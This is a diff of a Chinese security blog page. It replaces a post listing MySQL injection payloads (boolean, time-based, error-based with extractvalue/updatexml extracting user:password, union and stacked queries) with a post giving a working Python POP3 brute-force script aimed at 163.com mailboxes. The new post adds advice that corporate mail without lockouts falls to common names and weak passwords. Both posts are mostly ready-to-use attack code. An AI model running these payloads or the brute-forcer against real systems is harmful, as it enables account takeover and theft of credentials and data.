@@ -26,7 +26,7 @@
 
 
 
-  <meta name="keywords" content="mysql,sql注入," />
+  <meta name="keywords" content="总结,爆破," />
 
 
 
@@ -35,22 +35,37 @@
   <link rel="shorticon icon" type="image/x-icon" href="/favicon.ico?v=0.4.5.1" />
 
 
-<meta name="description" content="基于布尔的盲注mysql&amp;gt; select username from admin where id = 1 and 1=1;
-mysql&amp;gt; select username from admin where id = 1 and 1=2;//根据返回内容的真假判断是否存在注入
-基于时间的盲注mysql&amp;gt; select username from admin where id = 1">
+<meta name="description" content="前一阵研究了一下wooyun zone里看到的邮箱爆破脚本,自己试着改成了多线程,效果不是很好.在这里记录一下脚本实现思路以及关于邮箱爆破的一些想法.
+爆破脚本#pop3协议,SMTP协议需要时候再补
+
+import poplib
+
+pop = poplib.POP3(host,port,delay)
+print pop.getwelcome()  #如果连接成功打印welcome信息
+pop =">
 <meta property="og:type" content="article">
-<meta property="og:title" content="SQL注入练级攻略(5)-5种注入类型">
-<meta property="og:url" content="http://yoursite.com/2015/08/13/SQL注入练级攻略-5-5种注入方式/index.html">
+<meta property="og:title" content="邮箱爆破脚本总结">
+<meta property="og:url" content="http://yoursite.com/2015/09/15/邮箱爆破脚本总结/index.html">
 <meta property="og:site_name" content="FengGe">
-<meta property="og:description" content="基于布尔的盲注mysql&amp;gt; select username from admin where id = 1 and 1=1;
-mysql&amp;gt; select username from admin where id = 1 and 1=2;//根据返回内容的真假判断是否存在注入
-基于时间的盲注mysql&amp;gt; select username from admin where id = 1">
-<meta property="og:updated_time" content="2015-08-21T02:31:32.538Z">
+<meta property="og:description" content="前一阵研究了一下wooyun zone里看到的邮箱爆破脚本,自己试着改成了多线程,效果不是很好.在这里记录一下脚本实现思路以及关于邮箱爆破的一些想法.
+爆破脚本#pop3协议,SMTP协议需要时候再补
+
+import poplib
+
+pop = poplib.POP3(host,port,delay)
+print pop.getwelcome()  #如果连接成功打印welcome信息
+pop =">
+<meta property="og:updated_time" content="2015-09-15T09:50:42.375Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="SQL注入练级攻略(5)-5种注入类型">
-<meta name="twitter:description" content="基于布尔的盲注mysql&amp;gt; select username from admin where id = 1 and 1=1;
-mysql&amp;gt; select username from admin where id = 1 and 1=2;//根据返回内容的真假判断是否存在注入
-基于时间的盲注mysql&amp;gt; select username from admin where id = 1">
+<meta name="twitter:title" content="邮箱爆破脚本总结">
+<meta name="twitter:description" content="前一阵研究了一下wooyun zone里看到的邮箱爆破脚本,自己试着改成了多线程,效果不是很好.在这里记录一下脚本实现思路以及关于邮箱爆破的一些想法.
+爆破脚本#pop3协议,SMTP协议需要时候再补
+
+import poplib
+
+pop = poplib.POP3(host,port,delay)
+print pop.getwelcome()  #如果连接成功打印welcome信息
+pop =">
 
 
 <script type="text/javascript" id="hexo.configuration">
@@ -60,7 +75,7 @@ mysql&amp;gt; select username from admin where id = 1 and 1=2;//根据返回内�
   };
 </script>
 
-  <title> SQL注入练级攻略(5)-5种注入类型 | FengGe </title>
+  <title> 邮箱爆破脚本总结 | FengGe </title>
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
@@ -199,7 +214,7 @@ mysql&amp;gt; select username from admin where id = 1 and 1=2;//根据返回内�
           
           
             
-              SQL注入练级攻略(5)-5种注入类型
+              邮箱爆破脚本总结
             
           
         </h1>
@@ -208,34 +223,19 @@ mysql&amp;gt; select username from admin where id = 1 and 1=2;//根据返回内�
       <div class="post-meta">
         <span class="post-time">
           发表于
-          <time itemprop="dateCreated" datetime="2015-08-13T09:42:10+08:00" content="2015-08-13">
-            2015-08-13
+          <time itemprop="dateCreated" datetime="2015-09-15T16:07:46+08:00" content="2015-09-15">
+            2015-09-15
           </time>
         </span>
 
-        
-          <span class="post-category" >
-            &nbsp; | &nbsp; 分类于
-            
-              <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
-                <a href="/categories/SLQ注入练级系列/" itemprop="url" rel="index">
-                  <span itemprop="name">SLQ注入练级系列</span>
-                </a>
-              </span>
-
-              
-              
-
-            
-          </span>
         
 
         
           
             <span class="post-comments-count">
               &nbsp; | &nbsp;
-              <a href="/2015/08/13/SQL注入练级攻略-5-5种注入方式/#comments" itemprop="discussionUrl">
-                <span class="post-comments-count ds-thread-count" data-thread-key="2015/08/13/SQL注入练级攻略-5-5种注入方式/" itemprop="commentsCount"></span>
+              <a href="/2015/09/15/邮箱爆破脚本总结/#comments" itemprop="discussionUrl">
+                <span class="post-comments-count ds-thread-count" data-thread-key="2015/09/15/邮箱爆破脚本总结/" itemprop="commentsCount"></span>
               </a>
             </span>
           
@@ -249,44 +249,44 @@ mysql&amp;gt; select username from admin where id = 1 and 1=2;//根据返回内�
       
 
       
-        <span itemprop="articleBody"><h2 id="基于布尔的盲注">基于布尔的盲注</h2><pre><code>mysql&gt; <span class="keyword">select</span> username <span class="keyword">from</span> admin <span class="keyword">where</span> id = <span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">1</span>;
-mysql&gt; <span class="keyword">select</span> username <span class="keyword">from</span> admin <span class="keyword">where</span> id = <span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span>;<span class="comment">//根据返回内容的真假判断是否存在注入</span>
-</code></pre><h2 id="基于时间的盲注">基于时间的盲注</h2><pre><code>mysql&gt; select username from admin where id = <span class="number">1</span> or <span class="keyword">if</span><span class="params">(length<span class="params">(user)</span>&gt;<span class="number">10</span>,sleep<span class="params">(<span class="number">3</span>)</span>,<span class="number">0</span>)</span>;
-mysql&gt; select username from admin where id = <span class="number">1</span> or <span class="keyword">if</span><span class="params">(ascii<span class="params">(mid<span class="params">(lower<span class="params">(user<span class="params">()</span>)</span>)</span>,<span class="number">1</span>,<span class="number">1</span>)</span>=<span class="number">114</span>,sleep<span class="params">(<span class="number">3</span>)</span>,<span class="number">0</span>)</span>;
-<span class="comment">//如果if中条件成立返回延时.</span>
-<span class="comment">//BENCHMARK(100000,SHA1('true'))替代sleep(3)，前者在mysql 4/5适用，后者在mysql 5 适用.</span>
-</code></pre><h2 id="基于报错的注入">基于报错的注入</h2><p>-rand和group的冲突</p>
-<pre><code>mysql&gt; <span class="keyword">select</span> user <span class="keyword">from</span> mysql.user <span class="built_in">where</span> user=<span class="string">"test"</span> <span class="built_in">union</span> <span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="built_in">count</span>(*),concat(left(<span class="built_in">rand</span>(),<span class="number">3</span>),version())x <span class="keyword">from</span> information_schema.<span class="built_in">tables</span> <span class="built_in">group</span> <span class="keyword">by</span> x)b;
+        <span itemprop="articleBody"><p>前一阵研究了一下wooyun zone里看到的邮箱爆破脚本,自己试着改成了多线程,效果不是很好.<br>在这里记录一下脚本实现思路以及关于邮箱爆破的一些想法.</p>
+<h2 id="爆破脚本">爆破脚本</h2><pre><code>#pop3协议,SMTP协议需要时候再补
 
-mysql&gt; <span class="keyword">select</span> user <span class="keyword">from</span> mysql.user <span class="built_in">where</span> user=<span class="string">"test"</span> <span class="built_in">and</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="built_in">count</span>(*),concat_ws(<span class="string">":"</span>,user(),version(),<span class="built_in">floor</span>(<span class="built_in">rand</span>(<span class="number">0</span>)*<span class="number">2</span>))x <span class="keyword">from</span> information_schema.<span class="built_in">tables</span> <span class="built_in">group</span> <span class="keyword">by</span> x) b);
+import poplib
 
-<span class="comment">//x的语句为:concat_ws(":",user(),version(),floor(rand(0)*2)),rand()是不允许放在group by之后的所以用group by x 之后报错 显示出 user，version信息</span>
-</code></pre><p>遇到的问题：<br>1.如果想用报错注入显示database()信息时，不能为NULL，必须使用use databasename；选择一个数据库。<br>2.注意上述语句中使用 union 和 and 的区别 一个括号。<br>3.floor(rand(0)x2)其中乘以三乘以4都是可以的，2是一个习惯用法。<br>4.除了floor(rand(0)x3)，使用left(rand(),3)之类不确定的数值跟在group by之后也是可以报错的。</p>
-<p>-extractvalue注入</p>
-<pre><code>mysql&gt; <span class="keyword">select</span> user <span class="keyword">from</span> mysql.user <span class="keyword">where</span> user=<span class="string">"test"</span> <span class="function">and <span class="title">extractvalue</span>(<span class="params"><span class="number">1</span>, concat(<span class="number">0x7e</span>,@@version</span>))</span>;
-<span class="comment">//0x7e对应 ~</span>
-</code></pre><p>说明：<br>1.extractvalue函数是用来获取xml中的数据extractvalue(pram1,pram2)<br>2.在pram2的部分正常情况下应该填写路径，在这里我们构造了extractvalue(1, concat(0x7e,@@version))，系统报错显示了我们构造部分的内容<br>3.获取内容有长度限制,最长32位。</p>
-<p>-UpdateXML()注入</p>
-<pre><code>mysql&gt; select <span class="keyword">user</span> <span class="keyword">from</span> mysql.<span class="keyword">user</span> where <span class="keyword">user</span>=<span class="string">"test"</span> and updatexml(<span class="number">1</span>,concat(<span class="number">0</span>x7e,(SELECT distinct concat(<span class="number">0</span>x23,<span class="keyword">user</span>,<span class="number">0</span>x3a,password,<span class="number">0</span>x23) FROM <span class="keyword">user</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">0</span>x7e),<span class="number">1</span>);
-//<span class="number">0</span>x7e对应 ~
-mysql&gt; select <span class="keyword">user</span> <span class="keyword">from</span> mysql.<span class="keyword">user</span> where <span class="keyword">user</span>=<span class="string">"test"</span> and updatexml(<span class="number">1</span>,a,<span class="number">1</span>);//上述语句简化
-
-//a的值为concat(<span class="number">0</span>x7e,(SELECT concat(<span class="number">0</span>x23,<span class="keyword">user</span>,<span class="number">0</span>x3a,password,<span class="number">0</span>x23) FROM <span class="keyword">user</span> <span class="keyword">limit</span> <span class="number">1</span>))
-//对应的也可以替换为concat(<span class="number">0</span>x7e,@@version,<span class="keyword">user</span>(),database())
-</code></pre><p>说明：<br>1.UpdateXML(1,a,1)是一个使用不同的XML标记匹配和替换XML块的函数.<br>2.在a的部分添加目标内容~~如上代码.<br>3.获取内容有长度限制,最长32位。</p>
-<h2 id="联合查询注入">联合查询注入</h2><p>绕过了union和select基本就可以干所有的事情了<br>1.最基本的查询其他内容    </p>
-<pre><code>mysql&gt; <span class="keyword">select</span> id <span class="keyword">from</span> admin2 <span class="built_in">union</span> <span class="built_in">all</span> <span class="keyword">select</span> username <span class="keyword">from</span> admin;
-</code></pre><p>2.猜解字段数：</p>
-<pre><code>mysql&gt; select * from admin where id = <span class="number">1</span> <span class="keyword">union</span> select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5.</span>..from admin;
-<span class="comment">//知道返回正常就说明有几个字段</span>
-</code></pre><p>3.猜解字段</p>
-<pre><code>mysql&gt; select * from admin where id = <span class="number">1</span> <span class="keyword">union</span> select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,username,<span class="number">5.</span>..from admin
-<span class="comment">//猜解username字段是否存在</span>
-</code></pre><h2 id="堆查询注入">堆查询注入</h2><p>PHP使用PDO_MYSQL来连接数据库，便可以使用堆查询，堆查询可以同时执行多个语句。</p>
-<pre><code>mysql&gt; <span class="keyword">select</span> @@version;<span class="function"><span class="keyword">select</span> <span class="title">database</span>(<span class="params"></span>)</span>;
-mysql&gt; <span class="keyword">select</span> * <span class="keyword">from</span> user <span class="keyword">where</span> user=root and <span class="number">1</span>=<span class="number">0</span>; <span class="function">insert <span class="title">into</span> (<span class="params">username,password</span>) <span class="title">VALUES</span> (<span class="params"><span class="string">'BobbyTables'</span>, <span class="string">'kl20da$$'</span></span>)</span>;
-<span class="comment">//可以同时执行多个语句</span>
-</code></pre><p><em>以上内容使用的数据库版本为mysql 5.6.17.</em></p>
+pop = poplib.<span class="function"><span class="title">POP3</span><span class="params">(host,port,delay)</span></span>
+print pop.<span class="function"><span class="title">getwelcome</span><span class="params">()</span></span>  #如果连接成功打印welcome信息
+pop = pop.<span class="function"><span class="title">user</span><span class="params">(username)</span></span>
+pop.<span class="function"><span class="title">pass_</span><span class="params">(password)</span></span>     #到了这一步如果没有抛出异常,登录成功
+pop.<span class="function"><span class="title">quit</span><span class="params">()</span></span>
+</code></pre><p>注意: 1.在各个步骤的异常情况判断.<br>      2.代码第6行如果第一次认证失败,不可以继续验证.需要调用quit方法结束实例(为什么解释器中和实际运行的结果不一致).<br>      3.实现逻辑方面读取用户密码不断便利实现暴力破解.</p>
+<p>脚本代码</p>
+<pre><code><span class="comment"># coding=utf-8</span>
+<span class="keyword">import</span> threading, time, random, sys, poplib 
+<span class="keyword">from</span> copy <span class="keyword">import</span> copy 
+server = <span class="string">"mail.163"</span> <span class="comment">#host</span>
+suffix = <span class="string">"@163"</span>     <span class="comment">#邮箱后缀</span>
+delay = <span class="number">0.3</span>                <span class="comment">#延时</span>
+users = open(<span class="string">'username.txt'</span>,<span class="string">'r'</span>).readlines()  <span class="comment">#用户名字典</span>
+words = open(<span class="string">'password.txt'</span>,<span class="string">'r'</span>).readlines()  <span class="comment">#密码字典</span>
+success = []
+<span class="function"><span class="keyword">def</span> <span class="title">mailbruteforce</span><span class="params">(listuser,listpwd)</span>:</span> 
+  <span class="keyword">print</span> <span class="string">"Bruting..."</span>
+  <span class="keyword">for</span> user <span class="keyword">in</span> listuser: 
+    <span class="keyword">for</span> value <span class="keyword">in</span> listpwd : 
+      user = user.replace(<span class="string">"\n"</span>,suffix) 
+      value = value.replace(<span class="string">"\n"</span>,<span class="string">""</span>) 
+      <span class="keyword">try</span>: 
+        pop = poplib.POP3(server,<span class="number">110</span>,delay) 
+        pop.user(user) 
+        auth = pop.pass_(value) 
+        <span class="keyword">print</span> user,value,auth[<span class="number">1</span>:<span class="number">3</span>]
+        success.append(user+<span class="string">':'</span>+value)
+        pop.quit() 
+      <span class="keyword">except</span>:
+        <span class="keyword">pass</span>
+mailbruteforce(users,words) 
+</code></pre><h2 id="总结:">总结:</h2><p>1.企业邮箱是一个很好的入口,没有设置超时的企业邮箱使用人名top500和经典弱密码有很大的概率爆出密码.<br>2.脚本可以使用多任务<strong>提高效率</strong>,多进程,多线程,协程.<br>3.进一步研究邮箱拦截方式,突破超时.</p>
 </span>
       
     </div>
@@ -295,9 +295,9 @@ mysql&gt; <span class="keyword">select</span> * <span class="keyword">from</span
       
         <div class="post-tags">
           
-            <a href="/tags/mysql/" rel="tag">#mysql</a>
+            <a href="/tags/总结/" rel="tag">#总结</a>
           
-            <a href="/tags/sql注入/" rel="tag">#sql注入</a>
+            <a href="/tags/爆破/" rel="tag">#爆破</a>
           
         </div>
       
@@ -306,13 +306,11 @@ mysql&gt; <span class="keyword">select</span> * <span class="keyword">from</span
         <div class="post-nav">
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2015/08/13/漏洞记录-1/" rel="prev">漏洞记录-1</a>
-            
           </div>
 
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2015/08/12/SQL注入练级攻略-4-数据库常量及函数/" rel="next">SQL注入练级攻略(4)-数据库常量及函数</a>
+              <a href="/2015/09/14/安全测试思路总结/" rel="next">安全测试思路总结</a>
             
           </div>
         </div>
@@ -337,8 +335,8 @@ mysql&gt; <span class="keyword">select</span> * <span class="keyword">from</span
         
           <div class="comments" id="comments">
             
-              <div class="ds-thread" data-thread-key="2015/08/13/SQL注入练级攻略-5-5种注入方式/"
-                   data-title="SQL注入练级攻略(5)-5种注入类型" data-url="http://yoursite.com/2015/08/13/SQL注入练级攻略-5-5种注入方式/">
+              <div class="ds-thread" data-thread-key="2015/09/15/邮箱爆破脚本总结/"
+                   data-title="邮箱爆破脚本总结" data-url="http://yoursite.com/2015/09/15/邮箱爆破脚本总结/">
               </div>
             
           </div>
@@ -449,7 +447,7 @@ mysql&gt; <span class="keyword">select</span> * <span class="keyword">from</span
           <div class="post-toc">
             
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#基于布尔的盲注"><span class="nav-number">1.</span> <span class="nav-text">基于布尔的盲注</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#基于时间的盲注"><span class="nav-number">2.</span> <span class="nav-text">基于时间的盲注</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#基于报错的注入"><span class="nav-number">3.</span> <span class="nav-text">基于报错的注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#联合查询注入"><span class="nav-number">4.</span> <span class="nav-text">联合查询注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#堆查询注入"><span class="nav-number">5.</span> <span class="nav-text">堆查询注入</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#爆破脚本"><span class="nav-number">1.</span> <span class="nav-text">爆破脚本</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#总结:"><span class="nav-number">2.</span> <span class="nav-text">总结:</span></a></li></ol></div>
             
           </div>
           <div class="post-toc-indicator-bottom post-toc-indicator"></div>
